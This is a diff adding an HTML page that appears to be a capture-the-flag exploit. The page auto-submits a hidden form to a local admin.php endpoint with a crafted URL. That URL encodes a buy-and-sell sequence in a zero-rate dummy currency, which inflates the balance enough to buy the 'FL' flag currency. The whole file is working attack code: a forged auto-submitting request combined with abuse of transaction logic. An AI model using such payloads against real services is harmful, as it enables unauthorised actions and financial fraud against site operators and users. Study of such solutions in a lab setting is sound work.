@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>FL Currency Flag Exploit</title>
+</head>
+<body>
+    <h1>FL Currency Flag Extraction</h1>
+    <form id="attackForm" method="POST" action="http://localhost:5000/admin.php" target="_self">
+        <input type="hidden" name="url" value="">
+    </form>
+    
+    <script>
+        // Create transaction sequence to exploit FL currency
+        const transactions = [
+            {
+                amount: 1000001,
+                currency: 'ZZ',  // Dummy currency with 0 rate
+                op: 'BUY'
+            },
+            {
+                amount: 1000001, 
+                currency: 'ZZ',  // Sell same amount to increase balance
+                op: 'SELL'
+            },
+            {
+                amount: 1,
+                currency: 'FL',  // Buy FL currency to get flag
+                op: 'BUY'
+            }
+        ];
+        
+        // Convert to URL parameters for YAML parsing
+        let params = '';
+        transactions.forEach((tx, i) => {
+            params += `transactions[${i}][amount]=${tx.amount}&`;
+            params += `transactions[${i}][currency]=${tx.currency}&`;
+            params += `transactions[${i}][op]=${tx.op}&`;
+        });
+        
+        // Set the URL for admin.php to parse
+        const targetUrl = `http://localhost:5000/admin.php?${params.slice(0, -1)}`;
+        document.getElementById('attackForm').querySelector('input[name="url"]').value = targetUrl;
+        
+        // Auto-submit the form
+        document.getElementById('attackForm').submit();
+    </script>
+</body>
+</html>
